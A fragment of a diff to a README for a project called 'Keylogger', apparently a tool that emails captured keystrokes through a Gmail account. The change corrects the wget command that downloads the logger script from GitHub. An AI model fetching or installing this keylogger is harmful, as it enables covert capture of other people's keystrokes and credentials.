@@ -23,7 +23,7 @@ pip3 install argparse
 ```
 ### Installation
 ```bash
-wget https://github.com/Purp1eW0lf/Keylogger/logger.py
+wget https://raw.githubusercontent.com/Purp1eW0lf/Keylogger/main/logger.py
 ```
 ### Usage
 This logger requires you to feed your gmail email and password. I would create a throwaway account for this. 
